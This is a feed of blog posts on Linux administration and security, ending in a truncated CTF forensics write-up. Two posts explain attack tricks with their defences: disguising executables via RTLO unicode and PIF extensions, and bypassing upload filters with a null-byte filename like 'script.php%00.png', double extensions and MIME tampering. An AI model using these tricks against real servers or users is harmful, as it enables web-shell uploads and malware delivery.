      <category term="programming" scheme="http://rawsec.ml/tags/programming/"/>
    
      <category term="python" scheme="http://rawsec.ml/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>ArchLinux - Temporarily resize /tmp partition</title>
    <link href="http://rawsec.ml/en/archlinux-temporarily-resize-tmp-partition/"/>
    <id>http://rawsec.ml/en/archlinux-temporarily-resize-tmp-partition/</id>
    <published>2016-10-14T22:00:00.000Z</published>
    <updated>2016-10-15T16:37:51.804Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Context"><a href="#Context" class="headerlink" title="Context"></a>Context</h2><p><a href="https://wiki.archlinux.org/index.php/Tmpfs" target="_blank" rel="external">tmpfs</a> is a temporary file system that resides in memory and/or swap partition(s).</p>
<p><a href="https://wiki.archlinux.org/index.php/Tmpfs" target="_blank" rel="external">tmpfs</a> is commonly used for <code>/tmp</code>. By default, a tmpfs has its maximum size set to half the total of RAM. Note that the actual memory/swap consumption depends on how much you fill it up, as tmpfs partitions do not consume any memory until it is actually needed.</p>
<p>Problem example: You want to build an Android development lab in a VM. You set VM RAM to <strong>2GB</strong>. So by default, <code>/tmp</code> size will be <strong>1GB</strong>. You begin to install <a href="https://developer.android.com/studio/index.html" target="_blank" rel="external">Android Studio</a> but an error occured, telling you that there is not enough space on the disk. That’s because <code>/tmp</code> is too small to contain all temporary downloads of Android Studio during the install process.</p>
<h2 id="Fix"><a href="#Fix" class="headerlink" title="Fix"></a>Fix</h2><p>For a problem like the prvious example, we don’t want to do a permanent change as that’s just a punctual need. So to fix the problem we’ll temporarily increase the size of <code>/tmp</code>. It is posible because in our example the VM has 2GB RAM + 4GB SWAP, so we can increase a tmpfs partition up to 6GB.</p>
<p>Before the resizing:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$ df /tmp                                           </div><div class="line">Filesystem     1K-blocks  Used Available Use% Mounted on</div><div class="line">tmpfs            1048576    84   1048492   1% /tmp</div></pre></td></tr></table></figure>
<p>Temporary resize:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mount -o remount,size=4G,noatime /tmp</div></pre></td></tr></table></figure>
<p>After the resizing:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$ df /tmp</div><div class="line">Filesystem     1K-blocks  Used Available Use% Mounted on</div><div class="line">tmpfs            4194304    80   4194224   1% /tmp</div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Context&quot;&gt;&lt;a href=&quot;#Context&quot; class=&quot;headerlink&quot; title=&quot;Context&quot;&gt;&lt;/a&gt;Context&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://wiki.archlinux.org/index.php/Tmpf
    
    </summary>
    
      <category term="linux" scheme="http://rawsec.ml/categories/linux/"/>
    
      <category term="archlinux" scheme="http://rawsec.ml/categories/linux/archlinux/"/>
    
    
      <category term="linux" scheme="http://rawsec.ml/tags/linux/"/>
    
      <category term="archlinux" scheme="http://rawsec.ml/tags/archlinux/"/>
    
  </entry>
  
  <entry>
    <title>2 less known tricks of spoofing extensions on Windows</title>
    <link href="http://rawsec.ml/en/2-less-known-tricks-spoofing-extensions/"/>
    <id>http://rawsec.ml/en/2-less-known-tricks-spoofing-extensions/</id>
    <published>2016-10-12T22:00:00.000Z</published>
    <updated>2016-10-13T20:26:51.769Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Well-known-tricks"><a href="#Well-known-tricks" class="headerlink" title="Well-known tricks"></a>Well-known tricks</h2><p>Malware often tries to hide itself from being an obvious executable.</p>
<p>Windows malwares may:</p>
<ul>
<li>have crafted icons that are pretending to be real document files.</li>
<li>use double extensions such as <code>.pdf.exe</code> or <code>.doc.exe</code>, this is effective because by default Windows hides the extension so not aware users wouldn’t notice this an an executable as they are only seeing <code>.pdf</code> or <code>.doc</code> .</li>
<li>use lesser known extensions of executable format like <code>.scr</code>.</li>
</ul>
<h2 id="PIF-extension"><a href="#PIF-extension" class="headerlink" title="PIF extension"></a>PIF extension</h2><p>This trick is very effective because it hides the real extension even if the extension hiding feature is disabled.<br>The <code>.pif</code> extension is hidden and the original icon too but the file is still executable.</p>
<p>PIF means Program Information file, historically it was used for DOS program and is not used today because there is no more DOS applications. But Creating a PIF file for a DOS-based program creates a shortcut to the program executable and all the settings saved in the PIF are contained in the shortcut.</p>
<p>This trick was used in 2016 by a <a href="https://blog.malwarebytes.com/cybercrime/2016/09/lesser-known-tricks-of-spoofing-extensions/" target="_blank" rel="external">Petya/Mischa campaign in Poland</a>.</p>
<h2 id="RTLO-trick"><a href="#RTLO-trick" class="headerlink" title="RTLO trick"></a>RTLO trick</h2><p>RTLO (Right To Left Override) trick uses the fact that some languages are being written from right side towards left but not the majority of countries.<br>In order to support such languages, a Unicode character (<code>U+202e</code>) is used to do the switch between those two modes. It can be use maliciously, in order to displace the displayed extensions.</p>
<p>You can use <a href="https://www.branah.com/unicode-converter" target="_blank" rel="external">this site</a> to see how it works.</p>
<p><code>file.exe</code> (unicode text) = <code>\u0066\u0069\u006c\u0065\u002e\u0065\u0078\u0065</code> (unicode)</p>
<p>Just add the <code>\u202e</code> reverse character before the dot and you get:</p>
<p><code>file‮.exe</code> (unicode text) = <code>\u0066\u0069\u006c\u0065\u202e\u002e\u0065\u0078\u0065</code> (unicode)</p>
<p>Now add the spoofed extension (e.g. <code>txt</code> works very well because its reverse is also <code>txt</code>):</p>
<p><code>file‮txt.exe</code> (unicode text) = <code>\u0066\u0069\u006c\u0065\u202e\u0074\u0078\u0074\u002e\u0065\u0078\u0065</code> (unicode)</p>
<p>We get a <code>file.txt.exe</code> that looks like <code>fileexe.txt</code>.</p>
<p>Source: <a href="https://blog.malwarebytes.com/cybercrime/2016/09/lesser-known-tricks-of-spoofing-extensions/" target="_blank" rel="external">malwarebytes.com</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Well-known-tricks&quot;&gt;&lt;a href=&quot;#Well-known-tricks&quot; class=&quot;headerlink&quot; title=&quot;Well-known tricks&quot;&gt;&lt;/a&gt;Well-known tricks&lt;/h2&gt;&lt;p&gt;Malware of
    
    </summary>
    
      <category term="security" scheme="http://rawsec.ml/categories/security/"/>
    
      <category term="windows" scheme="http://rawsec.ml/categories/security/windows/"/>
    
    
      <category term="security" scheme="http://rawsec.ml/tags/security/"/>
    
      <category term="windows" scheme="http://rawsec.ml/tags/windows/"/>
    
  </entry>
  
  <entry>
    <title>Setup a proxy under Linux</title>
    <link href="http://rawsec.ml/en/proxy-linux/"/>
    <id>http://rawsec.ml/en/proxy-linux/</id>
    <published>2016-10-12T22:00:00.000Z</published>
    <updated>2016-10-13T17:48:40.228Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Environment-variables"><a href="#Environment-variables" class="headerlink" title="Environment variables"></a>Environment variables</h2><p>Lot of programs (such as wget, curl, pacman, …) use environment variables to determine the proxy of a given protocol.</p>
<p>Environment variables can be added per user in their <code>.bashrc</code> or <code>.zshrc</code> shell profile file with something like <code>export KEY=value</code>. The advantage is that variables can be used in order to avoid repeating the same proxy several times.</p>
<p>Or <code>/etc/environment</code> file stores the system-wide variables initialized upon user login. Or you can use <code>/etc/syconfig/proxy</code> under openSUSE.</p>
<p>To add proxy settings one time for everyone, you can execute the following script with sudo privilege (because you need to write into a system file: <code>/etc/environment</code>).</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#!/bin/bash</span></div><div class="line">file=/etc/environment</div><div class="line"></div><div class="line">http_proxy=http://proxy.example.org:8080/</div><div class="line">HTTP_PROXY=<span class="variable">$http_proxy</span></div><div class="line">https_proxy=<span class="variable">$http_proxy</span></div><div class="line">HTTPS_PROXY=<span class="variable">$https_proxy</span></div><div class="line">ftp_proxy=<span class="variable">$http_proxy</span></div><div class="line">FTP_PROXY=<span class="variable">$ftp_proxy</span></div><div class="line">rsync_proxy=<span class="variable">$http_proxy</span></div><div class="line">RSYNC_PROXY=<span class="variable">$rsync_proxy</span></div><div class="line">no_proxy=<span class="string">"localhost,127.0.0.1,localaddress,.localdomain.com"</span></div><div class="line">NO_PROXY=<span class="variable">$no_proxy</span></div><div class="line"></div><div class="line"><span class="built_in">echo</span> <span class="string">"http_proxy=<span class="variable">$http_proxy</span>"</span> &gt;&gt; <span class="variable">$file</span></div><div class="line"><span class="built_in">echo</span> <span class="string">"HTTP_PROXY=<span class="variable">$HTTP_PROXY</span>"</span> &gt;&gt; <span class="variable">$file</span></div><div class="line"><span class="built_in">echo</span> <span class="string">"https_proxy=<span class="variable">$https_proxy</span>"</span> &gt;&gt; <span class="variable">$file</span></div><div class="line"><span class="built_in">echo</span> <span class="string">"HTTPS_PROXY=<span class="variable">$HTTPS_PROXY</span>"</span> &gt;&gt; <span class="variable">$file</span></div><div class="line"><span class="built_in">echo</span> <span class="string">"ftp_proxy=<span class="variable">$ftp_proxy</span>"</span> &gt;&gt; <span class="variable">$file</span></div><div class="line"><span class="built_in">echo</span> <span class="string">"FTP_PROXY=<span class="variable">$FTP_PROXY</span>"</span> &gt;&gt; <span class="variable">$file</span></div><div class="line"><span class="built_in">echo</span> <span class="string">"rsync_proxy=<span class="variable">$rsync_proxy</span>"</span> &gt;&gt; <span class="variable">$file</span></div><div class="line"><span class="built_in">echo</span> <span class="string">"RSYNC_PROXY=<span class="variable">$RSYNC_PROXY</span>"</span> &gt;&gt; <span class="variable">$file</span></div><div class="line"><span class="built_in">echo</span> <span class="string">"no_proxy=<span class="variable">$no_proxy</span>"</span> &gt;&gt; <span class="variable">$file</span></div><div class="line"><span class="built_in">echo</span> <span class="string">"NO_PROXY=<span class="variable">$NO_PROXY</span>"</span> &gt;&gt; <span class="variable">$file</span></div></pre></td></tr></table></figure>
<h2 id="Proxy-settings-on-GNOME3"><a href="#Proxy-settings-on-GNOME3" class="headerlink" title="Proxy settings on GNOME3"></a>Proxy settings on GNOME3</h2><p>Some other graphical programs (such as Chromium or Rhythmbox) ignore those environment variables and use gnome (GTK3) settings. These settings can be modified through the gnome-control-center front end and also through gsettings (see the example below).</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">gsettings set org.gnome.system.proxy mode &apos;manual&apos;</div><div class="line">gsettings set org.gnome.system.proxy.http host &apos;proxy.example.org&apos;</div><div class="line">gsettings set org.gnome.system.proxy.http port 8080</div><div class="line">gsettings set org.gnome.system.proxy.ftp host &apos;proxy.example.org&apos;</div><div class="line">gsettings set org.gnome.system.proxy.ftp port 8080</div><div class="line">gsettings set org.gnome.system.proxy.https host &apos;proxy.example.org&apos;</div><div class="line">gsettings set org.gnome.system.proxy.https port 8080</div><div class="line">gsettings set org.gnome.system.proxy ignore-hosts &quot;[&apos;localhost&apos;, &apos;127.0.0.0/8&apos;, &apos;10.0.0.0/8&apos;, &apos;192.168.0.0/16&apos;, &apos;172.16.0.0/12&apos; , &apos;*.localdomain.com&apos; ]&quot;</div></pre></td></tr></table></figure>
<h2 id="Package-managers"><a href="#Package-managers" class="headerlink" title="Package managers"></a>Package managers</h2><p>Since you are using awesome tools like <a href="https://en.opensuse.org/Portal:Zypper" target="_blank" rel="external">zypper</a> (openSUSE) or <a href="https://wiki.archlinux.org/index.php/pacman" target="_blank" rel="external">pacman</a> (ArchLinux) you will probably don’t care about the following paragraph.</p>
<p>But users of apt-get or aptitue will need an additional step to use their package manager working with a proxy. They will need to edit <code>/etc/apt/apt.conf.d/proxy</code> and include the following lines:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">Acquire::http::proxy &quot;http://proxy.example.org:8080/&quot;;</div><div class="line">Acquire::ftp::proxy &quot;ftp://proxy.example.org:8080/&quot;;</div><div class="line">Acquire::https::proxy &quot;https://proxy.example.org:8080/&quot;;</div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Environment-variables&quot;&gt;&lt;a href=&quot;#Environment-variables&quot; class=&quot;headerlink&quot; title=&quot;Environment variables&quot;&gt;&lt;/a&gt;Environment variables&lt;/
    
    </summary>
    
      <category term="linux" scheme="http://rawsec.ml/categories/linux/"/>
    
    
      <category term="linux" scheme="http://rawsec.ml/tags/linux/"/>
    
      <category term="system" scheme="http://rawsec.ml/tags/system/"/>
    
      <category term="proxy" scheme="http://rawsec.ml/tags/proxy/"/>
    
  </entry>
  
  <entry>
    <title>ArchLinux - Setup an SFTP user for Deluge</title>
    <link href="http://rawsec.ml/en/archlinux-setup-sftp-user-deluge/"/>
    <id>http://rawsec.ml/en/archlinux-setup-sftp-user-deluge/</id>
    <published>2016-09-26T22:00:00.000Z</published>
    <updated>2016-10-12T21:07:54.505Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Requirement"><a href="#Requirement" class="headerlink" title="Requirement"></a>Requirement</h2><p>Deluge is already installed, configured and working.</p>
<p>The deluge user looks like: <code>deluge:x:125:125:Deluge user:/srv/deluge:/bin/false</code>.</p>
<p>A SSH server is already installed, configured and working.</p>
<h2 id="SFTP-setup"><a href="#SFTP-setup" class="headerlink" title="SFTP setup"></a>SFTP setup</h2><ul>
<li>Create the sftp user and add it to the deluge group (this will allow him to access to <code>/srv/deluge/</code>):</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># useradd sftpuser -d /home/sftpuser -G deluge</div></pre></td></tr></table></figure>
<ul>
<li>Modify the sshd config (<code>/etc/ssh/sshd_config</code>) and add this lines:</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">Match User sftpuser</div><div class="line">  ChrootDirectory %h</div><div class="line">  ForceCommand internal-sftp</div><div class="line">  AllowTcpForwarding no</div><div class="line">  PermitTunnel no</div><div class="line">  X11Forwarding no</div></pre></td></tr></table></figure>
<ul>
<li>Restart the sshd server:</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># systemctl restart sshd.service</div></pre></td></tr></table></figure>
<ul>
<li>Change chroot directory rights, this is required or sftp won’t let you connect. The home directory must be owned as root and not writable by another user or group. This includes the path leading to the directory.</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># chown root:root /home/sftpuser</div></pre></td></tr></table></figure>
<ul>
<li>You won’t we to connect in sftp if you user have <code>/bin/false</code> shell as it’s not defined in the <code>/etc/shells</code>. To disable normal ssh login, add <code>/bin/false</code> in <code>/etc/shells</code> and change sftpuser shell:</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># usermod -s /bin/false sftpuser</div></pre></td></tr></table></figure>
<ul>
<li>Test ssh access: (access should be refuse if <code>/bin/false</code> is used)</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># ssh sftpuser@localhost -p $SSH_PORT$</div></pre></td></tr></table></figure>
<ul>
<li>Test sftp access: (sftp user should be placed in the chroot environment)</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># sftp sftpuser@localhost -P $SSH_PORT$</div></pre></td></tr></table></figure>
<ul>
<li>Create the torrent folder to let sftp user access to deluge download folder:</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># mkdir /home/sftpuser/torrent</div></pre></td></tr></table></figure>
<ul>
<li>Give the torrent folder the appropriate rights:</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># chown sftpuser:sftpuser /home/sftpuser/torrent</div></pre></td></tr></table></figure>
<p>As sftpuser will be chrooted in his home directory (<code>/home/sftpuser/</code>) he won’t be able to access <code>/srv/deluge/Downloads</code> even if he has rights (he is in deluge group) and a symbolic link like <code>ln -s /srv/deluge/Downloads /home/sftpuser/deluge</code> won’t work because it is outside the chroot environment. For sftpuser accessing via sftp to the chroot environment, <code>/home/sftpuser/</code> will be the root directory <code>/</code> so the symbolic link to <code>/srv/deluge/Downloads</code> will in fact be wrong as <code>/home/sftpuser/srv/deluge/Downloads</code> doesn’t exist.</p>
<p>We can’t directly chroot sftpuser in <code>/srv/deluge/Downloads</code> because that will require to change the <code>/srv/deluge/Downloads/</code> folder ownership to <code>root:root</code> and so deluge user won’t be able to access it anymore.</p>
<p>We must chroot sftp user because letting him access to the whole system would be a security issue.</p>
<p>So we will give sftp user two home directory: one SFTP home that is locked down by root (<code>/home/sftpuser/</code>) and one home he can write to (<code>/home/sftpuser/torrent/</code>) so sshd will be satisfied and the system will remain secure. To do that, we will make the deluge folder (the writable home directory) appear as a subdirectory inside the SFTP home directory:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># mount --bind /srv/deluge/Downloads /home/sftpuser/torrent</div></pre></td></tr></table></figure>
<p>We can also add this into <code>/etc/fstab</code> to make this configuration permanent even after a reboot:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># echo &apos;/srv/deluge/Downloads /home/sftpuser/torrent none bind&apos; &gt;&gt; /etc/fstab</div></pre></td></tr></table></figure>
<p>SFTP user is now ready to access the deluge download folder via SFTP.</p>
<p>Thanks to the great <a href="https://wiki.archlinux.org/index.php/SFTP_chroot" target="_blank" rel="external">ArchLinux wiki</a>.</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Requirement&quot;&gt;&lt;a href=&quot;#Requirement&quot; class=&quot;headerlink&quot; title=&quot;Requirement&quot;&gt;&lt;/a&gt;Requirement&lt;/h2&gt;&lt;p&gt;Deluge is already installed, confi
    
    </summary>
    
      <category term="linux" scheme="http://rawsec.ml/categories/linux/"/>
    
      <category term="archlinux" scheme="http://rawsec.ml/categories/linux/archlinux/"/>
    
    
      <category term="linux" scheme="http://rawsec.ml/tags/linux/"/>
    
      <category term="archlinux" scheme="http://rawsec.ml/tags/archlinux/"/>
    
  </entry>
  
  <entry>
    <title>ArchLinux - Setup Deluge to use HTTPS</title>
    <link href="http://rawsec.ml/en/archlinux-setup-deluge-https/"/>
    <id>http://rawsec.ml/en/archlinux-setup-deluge-https/</id>
    <published>2016-09-24T22:00:00.000Z</published>
    <updated>2016-10-12T21:07:54.535Z</updated>
    
    <content type="html"><![CDATA[<ul>
<li>Stop <code>deluged</code> torrent process:</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">systemctl stop deluged.service</div></pre></td></tr></table></figure>
<ul>
<li>Go into deluge ssl folder:</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cd /srv/deluge/.config/deluge/ssl</div></pre></td></tr></table></figure>
<ul>
<li>Backup or remove the old certificate and key:</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mv daemon.cert daemon.cert.old &amp;&amp; mv daemon.pkey daemon.pkey.old</div></pre></td></tr></table></figure>
<ul>
<li>Generate the new deluge certificate and key:</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">openssl req -new -x509 -nodes -out deluge.cert.pem -keyout deluge.key.pem</div></pre></td></tr></table></figure>
<ul>
<li>Answer questions for teh certificate.</li>
<li>Be sure to give the right ownership to certificate and key:</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">chown -R deluge:deluge /srv/deluge/.config/deluge/ssl</div></pre></td></tr></table></figure>
<ul>
<li>Launch deluge web UI (User Interface) via http.</li>
<li>Open the <strong>Preferences</strong> menu, select <strong>Interface</strong> tab and check <strong>Use SSL</strong>.</li>
<li>Change <strong>Private Key</strong> into <code>ssl/deluge.key.pem</code> and <strong>Certificate</strong> into <code>ssl/deluge.cert.pem</code>.</li>
<li>Click <strong>Apply</strong> and then <strong>Ok</strong>.</li>
<li>Or instead of using the web UI, modify <code>/srv/deluge/.config/deluge/web.conf</code> (stopping <code>deluge-web</code> before is needed):<ul>
<li>“https”: true,</li>
<li>“pkey”: “ssl/deluge.key.pem”,</li>
<li>“cert”: “ssl/deluge.cert.pem”,</li>
</ul>
</li>
<li>Start <code>deluged</code> torrent process:</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">systemctl start deluged.service</div></pre></td></tr></table></figure>
<ul>
<li>Restart <code>deluge-web</code> UI:</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">systemctl restart deluge-web.service</div></pre></td></tr></table></figure>
<ul>
<li>Launch deluge web UI using https and enjoy.</li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;ul&gt;
&lt;li&gt;Stop &lt;code&gt;deluged&lt;/code&gt; torrent process:&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class
    
    </summary>
    
      <category term="linux" scheme="http://rawsec.ml/categories/linux/"/>
    
      <category term="archlinux" scheme="http://rawsec.ml/categories/linux/archlinux/"/>
    
    
      <category term="linux" scheme="http://rawsec.ml/tags/linux/"/>
    
      <category term="archlinux" scheme="http://rawsec.ml/tags/archlinux/"/>
    
  </entry>
  
  <entry>
    <title>Common upload flaws</title>
    <link href="http://rawsec.ml/en/common-upload-flaws/"/>
    <id>http://rawsec.ml/en/common-upload-flaws/</id>
    <published>2016-09-20T22:00:00.000Z</published>
    <updated>2016-10-12T21:07:54.485Z</updated>
    
    <content type="html"><![CDATA[<p>If a remote web server let you upload and execute scripts so this is beginning to turn turn bad.</p>
<p>Here are some common upload flaws:</p>
<ul>
<li>extensions blacklist</li>
<li>double extensions</li>
<li>MIME type</li>
<li>Null Byte</li>
</ul>
<h2 id="Extensions-blacklist"><a href="#Extensions-blacklist" class="headerlink" title="Extensions blacklist"></a>Extensions blacklist</h2><p>Blacklists are a bad idea in security.</p>
<p>For example if a server check that there is no <code>.php</code> file extension uploaded. Ok, you may upload a php script saved as <code>.png</code> but even if it is include or publicly available you won’t be able to execute it. So what? Did you know that a php server also interpret <code>.php2</code>, <code>.pwml</code>, <code>.phtml</code>?</p>
<p>Whit a blacklist, an administrator can forget to add them all. So to protect you, a better solution will be to establish a whitelist of authorized extension instead of a blacklist of forbidden ones.</p>
<h2 id="Double-extensions"><a href="#Double-extensions" class="headerlink" title="Double extensions"></a>Double extensions</h2><p>A server is filtering authorized extensions and only <code>.jpg</code>, <code>.gif</code>, <code>.jpeg</code>, <code>.png</code> authorized.</p>
<p>This kind of verification will only check the end extension with a regex matching what is after the dot in the filename.</p>
<p>To bypass this just rename your files from <code>file.php</code> to <code>file.php.png</code>.</p>
<p>In practice this is not so effective because the file have not the desired file extensions.</p>
<p>To protect from this kind of attack don’t trust filename, ignore them and rename the file with a hash. And before accepting it you may want to check what the file really is with the MIME type. Once uploaded on the server check again for example with file signature header and because it can be fake you can also you other methods. For example if you only allow png images use pngcheck to be sure that’s really a png.</p>
<h2 id="MIME-type"><a href="#MIME-type" class="headerlink" title="MIME type"></a>MIME type</h2><p>If an attacker name is php script <code>image.png</code> and temper his request and modify the content type from <code>application/octet-stream</code> to <code>image/png</code>, how can you know that’s not an image?</p>
<p>As said previously, don’t trust client side, check again server side.</p>
<h2 id="Null-byte"><a href="#Null-byte" class="headerlink" title="Null byte"></a>Null byte</h2><p>Double extensions works on the server but you can execute your script with an image extension? Let’s fix that.</p>
<p>Just usethe this old flaw: injection of a null byte, that will stop the php server reading the name of the file after the null byte.</p>
<p>Name your script something like <code>script.php%00.png</code> and upload it. What’s <code>%00</code>? It’s the hexadecimal representation of the null byte encoded for http. How does it work? See my <a href="/en/local-file-inclusion-vulnerability/#Null-Byte-Injection">post about LFI</a>, I talked about Null Byte injection.</p>
<p>To protect yourself still the same recommendation: check server side. You also need to keep your PHP version up to date because that flaw was corrected. And a more smart name parsing will only be better.</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;If a remote web server let you upload and execute scripts so this is beginning to turn turn bad.&lt;/p&gt;
&lt;p&gt;Here are some common upload flaws
    
    </summary>
    
      <category term="security" scheme="http://rawsec.ml/categories/security/"/>
    
    
      <category term="security" scheme="http://rawsec.ml/tags/security/"/>
    
      <category term="web" scheme="http://rawsec.ml/tags/web/"/>
    
      <category term="php" scheme="http://rawsec.ml/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>CSAW CTF - 50 - Kill - Forensics</title>
    <link href="http://rawsec.ml/en/CSAW-2016-50-kill-forensics/"/>
    <id>http://rawsec.ml/en/CSAW-2016-50-kill-forensics/</id>
    <published>2016-09-17T22:00:00.000Z</published>
    <updated>2016-10-12T21:07:54.498Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Informations"><a href="#Informations" class="headerlink" title="Informations"></a>Informations</h2><h3 id="Version"><a href="#Version" class="headerlink" title="Version"></a>Version</h3><table>
<thead>
<tr>
<th>By</th>
<th>Version</th>
<th>Comment</th>
</tr>
</thead>
<tbody>
<tr>
<td>noraj</td>
<td>1.0</td>
<td>Creation</td>
</tr>
</tbody>
</table>
<h3 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h3><ul>
<li><strong>Name</strong> : CSAW CTF Qualification Round 2016</li>
<li><strong>Website</strong> : <a href="https://ctf.csaw.io/" target="_blank" rel="external">https://ctf.csaw.io/</a></li>
<li><strong>Type</strong> : Online</li>
<li><strong>Format</strong> : Jeopardy</li>
<li><strong>CTF Time</strong> : <a href="https://ctftime.org/event/347" target="_blank" rel="external">link</a></li>
</ul>
<h3 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h3><p>Is kill can fix? Sign the autopsy file?</p>
<p><a href="https://ctf.csaw.io/static/uploads/a23ef5ecca7f30b77f59f21dba413b07/kill.pcapng" target="_blank" rel="external">kill.pcapng</a></p>
<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><ul>
<li>If you look at the presumed PcapNg file you can see it is certainly broken because you can’t open it with <a href="https://www.wireshark.org/" target="_blank" rel="external">Whireshark</a> and the <code>file</code> command shows it as raw data.</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">┌─[root@parrot]─[~/CTF/CSAW/2016/Qualification/50-kill-forensics]</div><div class="line">└──╼ #file kill.pcapng</div><div class="line">kill.pcapng: data</div></pre></td></tr></table></figure>
<ul>
<li>It’s certainly more than just a wrong header signature so we’ll use the <a href="https://f00l.de/pcapfix/" target="_blank" rel="external">pcapcfix</a> tool  to fix this.</li>
<li>As there is no more header we have to use <code>--pcapng</code> option because default behaviour of the tool is to repair as a simple pcap file.</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">┌─[root@parrot]─[~/CTF/CSAW/2016/Qualification/50-kill-forensics]</div><div class="line">└──╼ #/root/CTF/tools/pcapfix-1.1.0/pcapfix --pcapng kill.pcapng</div><div class="line">pcapfix 1.1.0 (c) 2012-2014 Robert Krause</div><div class="line"></div><div class="line">[*] Reading from file: kill.pcapng</div><div class="line">[*] Writing to file: fixed_kill.pcapng</div><div class="line">[*] File size: 2288848 bytes.</div><div class="line">[*] Unknown file type. Assuming PCAPNG format.</div><div class="line">[-] Unknown block type!: 0xaaddddaa ==&gt; SKIPPING.</div><div class="line">[-] Block size mismatch (0x1a2b3c4d != 0x0000008c) ==&gt; CORRECTED.</div><div class="line">[-] Found 128 bytes of unknown data ==&gt; SKIPPING.</div><div class="line">[-] No Section Block header found ==&gt; CREATING.</div><div class="line">[*] Progress:  20.02 %</div><div class="line">[*] Progress:  40.01 %</div><div class="line">[*] Progress:  60.04 %</div><div class="line">[*] Progress:  80.05 %</div><div class="line">[+] SUCCESS: 4 Corruption(s) 